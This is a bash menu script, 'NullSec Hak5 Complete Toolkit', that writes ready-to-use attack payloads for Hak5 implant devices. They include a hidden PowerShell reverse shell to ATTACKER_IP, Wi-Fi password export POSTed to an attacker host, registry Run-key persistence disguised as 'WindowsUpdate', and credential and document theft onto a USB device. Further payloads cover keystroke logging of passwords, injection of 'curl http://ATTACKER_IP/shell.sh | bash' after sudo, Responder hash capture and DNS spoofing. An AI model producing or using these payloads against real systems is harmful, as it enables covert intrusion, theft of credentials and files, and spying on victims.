#!/bin/bash
#===============================================================================
#  NULLSEC - HAK5 COMPLETE TOOLKIT
#===============================================================================
#  All-in-one manager for Hak5 devices:
#  - WiFi Pineapple (Mark VII, Enterprise)
#  - Pager / Signal Owl
#  - Key Croc
#  - Rubber Ducky
#  - Bash Bunny
#  - Shark Jack
#  - Screen Crab
#  - Packet Squirrel
#===============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOADS_BASE="$SCRIPT_DIR/payloads"
FIRMWARE_DIR="$SCRIPT_DIR/firmware"
LOOT_DIR="$SCRIPT_DIR/loot"

banner() {
    clear
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║  ██╗  ██╗ █████╗ ██╗  ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗  ║
    ║  ██║  ██║██╔══██╗██║ ██╔╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║  ║
    ║  ███████║███████║█████╔╝ ███████╗       ██║   ██║   ██║██║   ██║██║  ║
    ║  ██╔══██║██╔══██║██╔═██╗ ╚════██║       ██║   ██║   ██║██║   ██║██║  ║
    ║  ██║  ██║██║  ██║██║  ██╗███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
    ║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    ║                                                                        ║
    ║            NULLSEC HAK5 TOOLKIT - Complete Device Arsenal             ║
    ╚════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

setup() {
    mkdir -p "$PAYLOADS_BASE"/{pineapple,pager,ducky,bunny,croc,shark,squirrel,crab}
    mkdir -p "$FIRMWARE_DIR"
    mkdir -p "$LOOT_DIR"
}

#===============================================================================
# RUBBER DUCKY PAYLOAD GENERATOR
#===============================================================================

generate_ducky_payload() {
    local type="$1"
    local output="$PAYLOADS_BASE/ducky"
    
    case "$type" in
        revshell)
            cat > "$output/reverse-shell.txt" << 'DUCKY'
REM NullSec Reverse Shell - Windows
REM Change IP and PORT before encoding
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
ENTER
DUCKY
            log "Created: reverse-shell.txt"
            ;;
        
        exfil)
            cat > "$output/wifi-exfil.txt" << 'DUCKY'
REM NullSec WiFi Credential Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd /k mode con:cols=20 lines=1
ENTER
DELAY 500
STRING netsh wlan export profile key=clear folder=%TEMP%
ENTER
DELAY 1000
STRING powershell -w hidden -c "$f=Get-ChildItem $env:TEMP\*.xml;foreach($x in $f){$c=Get-Content $x -Raw;Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/loot' -Method POST -Body $c}"
ENTER
DUCKY
            log "Created: wifi-exfil.txt"
            ;;
        
        backdoor)
            cat > "$output/persistence.txt" << 'DUCKY'
REM NullSec Windows Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 500
STRING $t='$c=New-Object Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}';$e=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($t));Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value "powershell -w hidden -enc $e"
ENTER
DUCKY
            log "Created: persistence.txt"
            ;;
            
        *)
            warn "Unknown Ducky payload type: $type"
            echo "Available: revshell, exfil, backdoor"
            ;;
    esac
}

#===============================================================================
# BASH BUNNY PAYLOAD GENERATOR
#===============================================================================

generate_bunny_payload() {
    local type="$1"
    local output="$PAYLOADS_BASE/bunny"
    
    case "$type" in
        quickcreds)
            mkdir -p "$output/switch1"
            cat > "$output/switch1/payload.txt" << 'BUNNY'
#!/bin/bash
# NullSec QuickCreds - Bash Bunny
# Title: Credential Harvester

LED SETUP
ATTACKMODE HID STORAGE

GET SWITCH_POSITION
GET TARGET_HOSTNAME

LED ATTACK

# Windows credential dump
Q GUI r
Q DELAY 500
Q STRING powershell -w hidden
Q ENTER
Q DELAY 1000
Q STRING \$creds = cmdkey /list; \$wifi = netsh wlan show profiles | Select-String 'All User'; \$hashes = Get-WmiObject -Class Win32_Product | Select Name,Version; \$out = @{creds=\$creds;wifi=\$wifi;apps=\$hashes} | ConvertTo-Json; \$out | Out-File -FilePath (Get-Volume -FileSystemLabel 'YOURDEVICE').DriveLetter+':\loot\creds_\$env:COMPUTERNAME.json'
Q ENTER

LED FINISH
BUNNY
            log "Created: switch1/payload.txt (QuickCreds)"
            ;;
        
        exfiltrator)
            mkdir -p "$output/switch2"
            cat > "$output/switch2/payload.txt" << 'BUNNY'
#!/bin/bash
# NullSec Exfiltrator - Bash Bunny
# Title: Document Exfiltration

LED SETUP
ATTACKMODE HID STORAGE
GET SWITCH_POSITION

LED ATTACK

Q GUI r
Q DELAY 500
Q STRING powershell
Q ENTER
Q DELAY 1000
Q STRING \$drive = (Get-Volume -FileSystemLabel 'YOURDEVICE').DriveLetter; \$docs = Get-ChildItem -Path \$env:USERPROFILE -Include *.doc*,*.pdf,*.xls*,*.txt,*.csv -Recurse -ErrorAction SilentlyContinue | Select -First 50; foreach(\$f in \$docs){Copy-Item \$f.FullName -Destination "\$drive`:\loot\" -ErrorAction SilentlyContinue}
Q ENTER

DELAY 30000
LED FINISH
BUNNY
            log "Created: switch2/payload.txt (Exfiltrator)"
            ;;
            
        *)
            warn "Unknown Bunny payload type: $type"
            echo "Available: quickcreds, exfiltrator"
            ;;
    esac
}

#===============================================================================
# KEY CROC PAYLOAD GENERATOR  
#===============================================================================

generate_croc_payload() {
    local type="$1"
    local output="$PAYLOADS_BASE/croc"
    
    case "$type" in
        keylogger)
            cat > "$output/keylog-exfil.txt" << 'CROC'
# NullSec Key Croc Keylogger
# Logs keystrokes and exfiltrates via WiFi

MATCH sudo *
    SAVE LOG
    LED ATTACK
    Q DELAY 500
    
MATCH password*
    SAVE LOG
    LED ATTACK

MATCH *@*.*
    SAVE LOG
    LED ATTACK

# Exfil via WiFi every hour
WIFI_CONNECT YourSSID YourPassword
CRON 0 * * * * EXFIL_LOGS
CROC
            log "Created: keylog-exfil.txt"
            ;;
        
        inject)
            cat > "$output/command-inject.txt" << 'CROC'
# NullSec Key Croc Command Injection
# Injects commands when specific patterns detected

MATCH sudo su
    QUACK DELAY 100
    QUACK STRING  && curl http://ATTACKER_IP/shell.sh | bash
    SAVE LOG

MATCH ssh *
    SAVE LOG
    LED ATTACK

MATCH mysql -u*
    SAVE LOG
    LED ATTACK
CROC
            log "Created: command-inject.txt"
            ;;
            
        *)
            warn "Unknown Croc payload type: $type"
            echo "Available: keylogger, inject"
            ;;
    esac
}

#===============================================================================
# SHARK JACK PAYLOAD GENERATOR
#===============================================================================

generate_shark_payload() {
    local type="$1"
    local output="$PAYLOADS_BASE/shark"
    
    case "$type" in
        nmap)
            cat > "$output/nmap-scan.sh" << 'SHARK'
#!/bin/bash
# NullSec Shark Jack - Network Scanner

LOOT_DIR=/root/loot/nmap
SCAN_TYPE=${1:-quick}

LED SETUP
mkdir -p $LOOT_DIR

# Get target network
NETMODE DHCP_CLIENT
sleep 5
SUBNET=$(ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+/\d+' | head -1)
GATEWAY=$(ip route | grep default | awk '{print $3}')
NETWORK=$(echo $SUBNET | cut -d'/' -f1 | sed 's/\.[0-9]*$/.0\/24/')

LED ATTACK

case $SCAN_TYPE in
    quick)
        nmap -sn $NETWORK -oN $LOOT_DIR/hosts_$(date +%s).txt
        ;;
    full)
        nmap -sV -sC -T4 $NETWORK -oA $LOOT_DIR/full_$(date +%s)
        ;;
    stealth)
        nmap -sS -T2 -f $NETWORK -oN $LOOT_DIR/stealth_$(date +%s).txt
        ;;
esac

LED FINISH
sync
SHARK
            chmod +x "$output/nmap-scan.sh"
            log "Created: nmap-scan.sh"
            ;;
        
        responder)
            cat > "$output/responder-attack.sh" << 'SHARK'
#!/bin/bash
# NullSec Shark Jack - Responder Attack

LED SETUP
LOOT_DIR=/root/loot/responder
mkdir -p $LOOT_DIR

NETMODE DHCP_CLIENT
sleep 5

LED ATTACK

# Start Responder
timeout 300 python /tools/responder/Responder.py -I eth0 -wrf &

# Wait and collect
sleep 310

# Copy hashes
cp /tools/responder/logs/*.txt $LOOT_DIR/ 2>/dev/null

LED FINISH
sync
SHARK
            chmod +x "$output/responder-attack.sh"
            log "Created: responder-attack.sh"
            ;;
            
        *)
            warn "Unknown Shark payload type: $type"
            echo "Available: nmap, responder"
            ;;
    esac
}

#===============================================================================
# PACKET SQUIRREL PAYLOAD GENERATOR
#===============================================================================

generate_squirrel_payload() {
    local type="$1"
    local output="$PAYLOADS_BASE/squirrel"
    
    case "$type" in
        tcpdump)
            cat > "$output/passive-capture.sh" << 'SQUIRREL'
#!/bin/bash
# NullSec Packet Squirrel - Passive Capture

LOOT_DIR=/root/loot/pcap
mkdir -p $LOOT_DIR

LED SETUP
NETMODE TRANSPARENT

LED ATTACK

# Capture traffic
tcpdump -i br-lan -w $LOOT_DIR/capture_$(date +%s).pcap &
TCPDUMP_PID=$!

# Run for 1 hour
sleep 3600

kill $TCPDUMP_PID
LED FINISH
sync
SQUIRREL
            chmod +x "$output/passive-capture.sh"
            log "Created: passive-capture.sh"
            ;;
        
        dnsspoof)
            cat > "$output/dns-spoof.sh" << 'SQUIRREL'
#!/bin/bash
# NullSec Packet Squirrel - DNS Spoofing

REDIRECT_IP="${1:-192.168.1.100}"

LED SETUP
NETMODE NAT

# DNS spoof config
cat > /tmp/hosts << EOF
$REDIRECT_IP *.facebook.com
$REDIRECT_IP *.google.com
$REDIRECT_IP *
EOF

LED ATTACK

# Enable DNS spoofing
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
dnsspoof -i br-lan -f /tmp/hosts &

# Log connections
tcpdump -i br-lan -w /root/loot/dns_$(date +%s).pcap port 80 or port 443 &

LED FINISH
SQUIRREL
            chmod +x "$output/dns-spoof.sh"
            log "Created: dns-spoof.sh"
            ;;
            
        *)
            warn "Unknown Squirrel payload type: $type"
            echo "Available: tcpdump, dnsspoof"
            ;;
    esac
}

#===============================================================================
# INTERACTIVE MENU
#===============================================================================

device_menu() {
    local device="$1"
    
    while true; do
        echo ""
        echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║     ${device^^} PAYLOAD MENU              ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════╣${NC}"
        
        case "$device" in
            pineapple)
                echo -e "${CYAN}║  1. Build Custom Firmware             ║${NC}"
                echo -e "${CYAN}║  2. Generate Payloads                 ║${NC}"
                echo -e "${CYAN}║  3. Launch C2 Panel                   ║${NC}"
                echo -e "${CYAN}║  4. Deploy to Device                  ║${NC}"
                ;;
            ducky)
                echo -e "${CYAN}║  1. Reverse Shell Payload             ║${NC}"
                echo -e "${CYAN}║  2. WiFi Exfil Payload                ║${NC}"
                echo -e "${CYAN}║  3. Persistence Payload               ║${NC}"
                echo -e "${CYAN}║  4. Encode Payload (inject.bin)       ║${NC}"
                ;;
            bunny)
                echo -e "${CYAN}║  1. QuickCreds Payload                ║${NC}"
                echo -e "${CYAN}║  2. Exfiltrator Payload               ║${NC}"
                echo -e "${CYAN}║  3. Custom Payload                    ║${NC}"
                ;;
            croc)
                echo -e "${CYAN}║  1. Keylogger Payload                 ║${NC}"
                echo -e "${CYAN}║  2. Command Inject Payload            ║${NC}"
                ;;
            shark)
                echo -e "${CYAN}║  1. Nmap Scanner Payload              ║${NC}"
                echo -e "${CYAN}║  2. Responder Attack                  ║${NC}"
                ;;
            squirrel)
                echo -e "${CYAN}║  1. Passive Capture                   ║${NC}"
                echo -e "${CYAN}║  2. DNS Spoof Attack                  ║${NC}"
                ;;
            pager)
                echo -e "${CYAN}║  1. Generate All Payloads             ║${NC}"
                echo -e "${CYAN}║  2. Create Deployment Package         ║${NC}"
                ;;
        esac
        
        echo -e "${CYAN}║  0. Back                              ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select: " choice
        
        case "$device" in
            pineapple)
                case $choice in
                    1) bash "$SCRIPT_DIR/build-firmware.sh" build ;;
                    2) bash "$SCRIPT_DIR/build-firmware.sh" payloads ;;
                    3) bash "$SCRIPT_DIR/pineapple-c2.sh" menu ;;
                    4)
                        read -p "Target IP: " ip
                        read -p "Payload: " payload
                        bash "$SCRIPT_DIR/pineapple-c2.sh" deploy "$ip" "$payload"
                        ;;
                    0) return ;;
                esac
                ;;
            ducky)
                case $choice in
                    1) generate_ducky_payload revshell ;;
                    2) generate_ducky_payload exfil ;;
                    3) generate_ducky_payload backdoor ;;
                    4)
                        warn "Use Hak5 Payload Encoder or java -jar encoder.jar"
                        info "Or: https://shop.hak5.org/pages/ducky-encoder"
                        ;;
                    0) return ;;
                esac
                ;;
            bunny)
                case $choice in
                    1) generate_bunny_payload quickcreds ;;
                    2) generate_bunny_payload exfiltrator ;;
                    3)
                        read -p "Payload name: " name
                        mkdir -p "$PAYLOADS_BASE/bunny/$name"
                        ${EDITOR:-nano} "$PAYLOADS_BASE/bunny/$name/payload.txt"
                        ;;
                    0) return ;;
                esac
                ;;
            croc)
                case $choice in
                    1) generate_croc_payload keylogger ;;
                    2) generate_croc_payload inject ;;
                    0) return ;;
                esac
                ;;
            shark)
                case $choice in
                    1) generate_shark_payload nmap ;;
                    2) generate_shark_payload responder ;;
                    0) return ;;
                esac
                ;;
            squirrel)
                case $choice in
                    1) generate_squirrel_payload tcpdump ;;
                    2) generate_squirrel_payload dnsspoof ;;
                    0) return ;;
                esac
                ;;
            pager)
                case $choice in
                    1) bash "$SCRIPT_DIR/pager-payloads.sh" generate ;;
                    2) bash "$SCRIPT_DIR/pager-payloads.sh" package ;;
                    0) return ;;
                esac
                ;;
        esac
    done
}

main_menu() {
    while true; do
        banner
        echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║       SELECT HAK5 DEVICE              ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  1. WiFi Pineapple                    ║${NC}"
        echo -e "${CYAN}║  2. Pager / Signal Owl                ║${NC}"
        echo -e "${CYAN}║  3. Rubber Ducky                      ║${NC}"
        echo -e "${CYAN}║  4. Bash Bunny                        ║${NC}"
        echo -e "${CYAN}║  5. Key Croc                          ║${NC}"
        echo -e "${CYAN}║  6. Shark Jack                        ║${NC}"
        echo -e "${CYAN}║  7. Packet Squirrel                   ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  8. Generate ALL Payloads             ║${NC}"
        echo -e "${CYAN}║  9. List All Payloads                 ║${NC}"
        echo -e "${CYAN}║  0. Exit                              ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select device: " choice
        
        case $choice in
            1) device_menu pineapple ;;
            2) device_menu pager ;;
            3) device_menu ducky ;;
            4) device_menu bunny ;;
            5) device_menu croc ;;
            6) device_menu shark ;;
            7) device_menu squirrel ;;
            8)
                log "Generating all payloads..."
                generate_ducky_payload revshell
                generate_ducky_payload exfil
                generate_ducky_payload backdoor
                generate_bunny_payload quickcreds
                generate_bunny_payload exfiltrator
                generate_croc_payload keylogger
                generate_croc_payload inject
                generate_shark_payload nmap
                generate_shark_payload responder
                generate_squirrel_payload tcpdump
                generate_squirrel_payload dnsspoof
                bash "$SCRIPT_DIR/pager-payloads.sh" generate 2>/dev/null
                bash "$SCRIPT_DIR/build-firmware.sh" payloads 2>/dev/null
                log "All payloads generated!"
                read -p "Press Enter..."
                ;;
            9)
                echo -e "${CYAN}All Payloads:${NC}"
                find "$PAYLOADS_BASE" -type f \( -name "*.txt" -o -name "*.sh" \) | sort
                read -p "Press Enter..."
                ;;
            0) 
                echo -e "${GREEN}Goodbye!${NC}"
                exit 0 
                ;;
        esac
    done
}

# Main
setup
main_menu
